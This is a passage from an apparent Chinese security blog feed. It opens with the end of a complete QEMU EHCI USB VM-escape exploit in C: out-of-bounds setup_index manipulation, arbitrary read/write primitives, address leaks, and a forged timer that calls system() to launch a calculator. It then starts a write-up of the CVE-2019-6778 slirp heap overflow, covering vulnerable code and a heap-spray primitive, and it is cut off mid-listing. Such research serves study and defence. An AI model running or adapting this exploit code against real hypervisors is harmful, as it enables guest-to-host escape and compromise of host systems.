class="hljs-keyword">define</span> PORTSC_PRESET       (1 &lt;&lt; 8)     <span class="hljs-comment">// Port Reset</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PED          (1 &lt;&lt; 2)     <span class="hljs-comment">// Port Enable/Disable</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_RUNSTOP      (1 &lt;&lt; 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_PSE          (1 &lt;&lt; 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_OUT         0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_IN          0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_ACTIVE    (1 &lt;&lt; 7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_SETUP     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_IN        1 <span class="hljs-comment">/* device -&gt; host */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_OUT       0 <span class="hljs-comment">/* host -&gt; device */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SETUP_STATE_DATA    2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_TBYTES_SH 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_PID_SH    8</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> next;                    <span class="hljs-comment">/* Standard next link pointer */</span><br><br>    <span class="hljs-comment">/* endpoint characteristics */</span><br>    <span class="hljs-type">uint32_t</span> epchar;<br><br>    <span class="hljs-comment">/* endpoint capabilities */</span><br>    <span class="hljs-type">uint32_t</span> epcap;<br><br>    <span class="hljs-type">uint32_t</span> current_qtd;             <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> next_qtd;                <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> altnext_qtd;<br><br>    <span class="hljs-type">uint32_t</span> token;                   <span class="hljs-comment">/* Same as QTD token */</span><br>    <span class="hljs-type">uint32_t</span> bufptr[<span class="hljs-number">5</span>];               <span class="hljs-comment">/* Standard buffer pointer */</span><br><br>&#125; EHCIqh;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> next;                    <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> altnext;                 <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> token;<br><br>    <span class="hljs-type">uint32_t</span> bufptr[<span class="hljs-number">5</span>];               <span class="hljs-comment">/* Standard buffer pointer */</span><br><br>&#125; EHCIqtd;<br><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    close(fd);<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span>&#123;<br>    *(<span class="hljs-type">uint32_t</span> *)(mmio + addr) = value;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span>&#123;<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint32_t</span> *)(mmio + addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_length</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> len, <span class="hljs-type">uint8_t</span> option)</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = gva_to_gpa(qtd);<br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">8</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = gva_to_gpa(setup_buf);<br><br>    setup_buf[<span class="hljs-number">0</span>] = option;<br>    <span class="hljs-comment">// setup_buf[2] = value &amp; 0xff;</span><br>    <span class="hljs-comment">// setup_buf[3] = (value &gt;&gt; 8 ) &amp; 0xff;</span><br>    <span class="hljs-comment">// setup_buf[4] = index &amp; 0xff;</span><br>    <span class="hljs-comment">// setup_buf[5] = (index &gt;&gt; 8 ) &amp; 0xff;</span><br>    setup_buf[<span class="hljs-number">6</span>] = len &amp; <span class="hljs-number">0xff</span>;<br>    setup_buf[<span class="hljs-number">7</span>] = (len &gt;&gt; <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xff</span>;<br><br>    mmio_write(<span class="hljs-number">0x2c</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x34</span>, gva_to_gpa(buf));<br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);<br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_from_usb</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = gva_to_gpa(qtd);<br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_IN &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x2000</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = gva_to_gpa(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = gva_to_gpa(data_buf_oob);<br><br>    mmio_write(<span class="hljs-number">0x2c</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x34</span>, gva_to_gpa(buf));<br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);<br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_to_usb</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = gva_to_gpa(qtd);<br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_OUT &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x2000</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = gva_to_gpa(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = gva_to_gpa(data_buf_oob);<br><br>    mmio_write(<span class="hljs-number">0x2c</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x34</span>, gva_to_gpa(buf));<br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);<br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">uint32_t</span> size)</span>&#123;<br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_IN;<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + size; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    read_from_usb();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">void</span> *payload, <span class="hljs-type">uint32_t</span> payload_size)</span>&#123;<br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_OUT;<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + payload_size; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    <span class="hljs-built_in">memcpy</span>(data_buf, payload, payload_size);<br>    <span class="hljs-comment">//getchar();</span><br>    write_to_usb();<br>&#125;<br><br><span class="hljs-type">char</span> cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    mmio         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x3000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    mlock(buf, <span class="hljs-number">0x3000</span>);<br><br>    entry = buf + <span class="hljs-number">4</span>;<br>    qh = buf + <span class="hljs-number">0x100</span>;<br>    qtd = buf + <span class="hljs-number">0x200</span>;<br>    setup_buf = buf + <span class="hljs-number">0x300</span>;<br>    payload_buf = buf + <span class="hljs-number">0x400</span>;<br>    data_buf = buf + <span class="hljs-number">0x1000</span>;<br>    data_buf_oob = buf + <span class="hljs-number">0x2000</span>;<br><br>    *entry = gva_to_gpa(qh) + <span class="hljs-number">2</span>;<br><br>    <span class="hljs-comment">// set_length(0x100, USB_DIR_IN);</span><br>    arb_read(<span class="hljs-number">0x2004</span>, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">size_t</span> elf_addr = *(<span class="hljs-type">uint64_t</span>*)(data_buf + <span class="hljs-number">0x18</span>);<br>    <span class="hljs-type">size_t</span> elf_base_addr = elf_addr - <span class="hljs-number">0x538467</span>;<br>    <span class="hljs-type">size_t</span> system_plt = elf_base_addr + <span class="hljs-number">0x2c4940</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_elf_base_addr_is %#lx\n&quot;</span>, elf_base_addr);<br><br>    <span class="hljs-type">size_t</span> heap_addr = *(<span class="hljs-type">uint64_t</span>*)(data_buf);<br>    <span class="hljs-type">size_t</span> usb_device_addr = heap_addr - <span class="hljs-number">0x2050</span>;<br>    <span class="hljs-type">size_t</span> ehci_state_addr = usb_device_addr - <span class="hljs-number">0x83260</span>;<br>    <span class="hljs-type">size_t</span> usb_data_buf = usb_device_addr + <span class="hljs-number">0xdc</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_usb_device_addr_is %#lx\n&quot;</span>, usb_device_addr);<br><br>    <span class="hljs-type">size_t</span> time_list = usb_device_addr - <span class="hljs-number">0xba9b50</span>;<br><br>    <span class="hljs-type">size_t</span> fake_timer[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">size_t</span> fake_timer_addr = usb_data_buf + <span class="hljs-number">4</span>;<br>    <span class="hljs-type">size_t</span> cmd_addr = fake_timer_addr + <span class="hljs-number">0x40</span>;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    fake_timer[i++] = <span class="hljs-number">0xffffffffffffffff</span>;<br>    fake_timer[i++] = time_list;<br>    fake_timer[i++] = system_plt;<br>    fake_timer[i++] = cmd_addr;<br>    fake_timer[i++] = <span class="hljs-number">0</span>;<br>    fake_timer[i++] = <span class="hljs-number">0</span>;<br>    fake_timer[i++] = <span class="hljs-number">0</span>;<br>    fake_timer[i++] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">memcpy</span>(payload_buf, fake_timer, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-built_in">memcpy</span>(payload_buf + <span class="hljs-number">8</span>, cmd, <span class="hljs-number">0x40</span>);<br>    *(payload_buf + <span class="hljs-number">0x10</span>) = fake_timer_addr;<br><br>    <span class="hljs-type">uint32_t</span> offset = (<span class="hljs-type">uint32_t</span>)(time_list + <span class="hljs-number">0x40</span> - usb_data_buf);    <br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    <span class="hljs-built_in">memcpy</span>(data_buf + <span class="hljs-number">0xc</span>, payload_buf, <span class="hljs-number">0x80</span>);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_OUT;<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + <span class="hljs-number">8</span>; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    <span class="hljs-built_in">memcpy</span>(data_buf, payload_buf + <span class="hljs-number">0x10</span>, <span class="hljs-number">8</span>);<br>    write_to_usb();<br>&#125;<br></code></pre></td></tr></table></figure><p>执行效果如下：</p><img src="/img/21/Screenshot 2023-10-11 011141.png" style="zoom: 67%;" />]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-6778</title>
    <link href="/2023/10/07/CVE-2019-6778/"/>
    <url>/2023/10/07/CVE-2019-6778/</url>
    
    <content type="html"><![CDATA[<p>最近不知道为什么又重新开始对qemu的漏洞产生了兴趣，可能是V8实在学不明白（感觉太玄学了，😵‍💫）</p><p>真正复现建议直接看大佬的文章：<a href="https://www.anquanke.com/post/id/197639">https://www.anquanke.com/post/id/197639</a>   、     <a href="https://github.com/0xKira/qemu-vm-escape/blob/master/writeup_zh.md">https://github.com/0xKira/qemu-vm-escape/blob/master/writeup_zh.md</a></p><p>该漏洞存在于qemu3.1.0中，内核与文件系统的环境直接拿V1NKe师傅出的题目即可：<a href="https://github.com/V1NKe/learning-qemu/tree/master/ctf/original/2020-geekpwn-V1NKe&#39;sQEMU-final">https://github.com/V1NKe/learning-qemu/tree/master/ctf/original/2020-geekpwn-V1NKe&#39;sQEMU-final</a></p><p>构建镜像时，由于Debian的stretch这个版本已经不能在debootstrap中继续使用了，改用为buster即可。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>具体漏洞存在于slirp&#x2F;tcp_subr.c中的<a href="https://elixir.bootlin.com/qemu/v3.1.0/source/slirp/tcp_subr.c#L611">tcp_emu</a>，在使用113端口(Identification protocol)时进入该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> EMU_IDENT:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Identification protocol as per rfc-1413</span><br><span class="hljs-comment"> */</span><br><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">socket</span> *<span class="hljs-title">tmpso</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">addr</span>;</span><br><span class="hljs-type">socklen_t</span> addrlen = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sbuf</span> *<span class="hljs-title">so_rcv</span> =</span> &amp;so-&gt;so_rcv;<br><br><span class="hljs-built_in">memcpy</span>(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);<br>so_rcv-&gt;sb_wptr += m-&gt;m_len;<br>so_rcv-&gt;sb_rptr += m-&gt;m_len;<br>m-&gt;m_data[m-&gt;m_len] = <span class="hljs-number">0</span>; <span class="hljs-comment">/* NULL terminate */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(m-&gt;m_data, <span class="hljs-string">&#x27;\r&#x27;</span>) || <span class="hljs-built_in">strchr</span>(m-&gt;m_data, <span class="hljs-string">&#x27;\n&#x27;</span>)) &#123;<br>...<br>&#125;<br>m_free(m);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>而该函数中的<code>memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len)</code>语句没有对缓冲区大小进行任何检查，多次调用可以无限拷贝数据造成堆溢出。</p><p>关于溢出的位置，这里不太能理解ama2in9师傅的这个<a href="https://ama2in9.top/2021/01/02/cve-2019-6788/">追加拷贝</a>：</p>  <img src="/img/20/Screenshot 2023-10-09 095605.png" style="zoom:50%;" /><p>查看上层的tcp_input函数，在tcp_emu函数中的返回值是0，就不会进入sbappend函数，溢出的位置就是tcp_emu函数中的memcpy导致的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ti-&gt;ti_ack == tp-&gt;snd_una &amp;&amp;<br>    tcpfrag_list_empty(tp) &amp;&amp;<br>    ti-&gt;ti_len &lt;= sbspace(&amp;so-&gt;so_rcv)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * this is a pure, in-sequence data packet</span><br><span class="hljs-comment"> * with nothing on the reassembly queue and</span><br><span class="hljs-comment"> * we have enough buffer space to take it.</span><br><span class="hljs-comment"> */</span><br>tp-&gt;rcv_nxt += ti-&gt;ti_len;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Add data to socket buffer.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (so-&gt;so_emu) &#123;<br><span class="hljs-keyword">if</span> (tcp_emu(so,m)) sbappend(so, m);<br>&#125; <span class="hljs-keyword">else</span><br>sbappend(so, m);<br></code></pre></td></tr></table></figure><p>​                                               </p><p>自己也测试了一下数据中存在<code>\r\n</code>的这种情况</p><p>在tcp_emu函数结束时的参数如下：</p><img src="/img/20/Screenshot 2023-10-09 105434.png" style="zoom:67%;" /><p>并且监听的端口也会出现相应的值：</p><img src="/img/20/Screenshot 2023-10-09 105736.png" style="zoom:80%;" /><p>下次再进入tcp_input中的判断时：</p><img src="/img/20/Screenshot 2023-10-09 105509.png" style="zoom: 67%;" /><p>​                                     </p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>接下来操作都主要与IP数据报文的这些字段有关：</p><ul><li><strong>Identification ：</strong>对应C语言ip结构体的ip_id。当一个IP数据包传输过程中经过一个具有较小最大传输单元（MTU）的网络链路时，该数据包可能会被分割成多个片段，以适应较小的网络链路。该标志在这种情况下用于标识原始数据包的各个片段。每个片段将具有相同的值，以便接收端知道它们属于同一个数据包。</li><li><strong>DF ：</strong> 如果DF标志被设置为1，表示数据包禁止分片。如果数据包太大无法在网络中传输，它将被丢弃。</li><li><strong>MF ：</strong> 如果MF标志被设置为1，表示这个数据包是分片的一部分，还有更多的片段。如果MF标志为0，表示这是最后一个片段。</li><li><strong>Fragmentation offset (13 bits)：</strong>表示此包数据在重组时的偏移，和DF、MF都在C语言ip结构体的ip_off中。</li></ul><h3 id="malloc原语"><a href="#malloc原语" class="headerlink" title="malloc原语"></a>malloc原语</h3><p>由于是堆溢出漏洞，也就需要知道<code>so_rcv-&gt;sb_wptr</code>堆块后面的数据是属于哪里的，这样溢出后覆盖的值才能进行有效攻击。但是每次启动虚拟机<code>so_rcv-&gt;sb_wptr</code>这个堆块都是随机分配的，这里需要使用malloc原语去实现堆喷，让so_rcv-&gt;sb_wptr使用top chunk（超级大的largebin也行）去分配，让so_rcv-&gt;sb_wptr后堆块排布完全可以操纵。</p><p>在<a href="https://elixir.bootlin.com/qemu/v3.1.0/source/slirp/ip_input.c#L76">ip_input函数</a>中，设置一个IP包DF&#x3D;0   MF&#x3D;1，表示其可以分片并且属于数据包的一部分，发送后进入ip_input函数，可以通过<code>ip-&gt;ip_off &amp;~ IP_DF</code>判断，接下来会在链表中获取其它IP包，判断ip_id、ip_src.s_addr 、ip-&gt;ip_dst.s_addr和ip_p寻找相同的IP分段包，没有找到fp &#x3D; NULL，进入ip_reass函数后可以满足<code>fp == NULL</code>，继续进入m_get函数就可以分配一个0x670大小的堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span 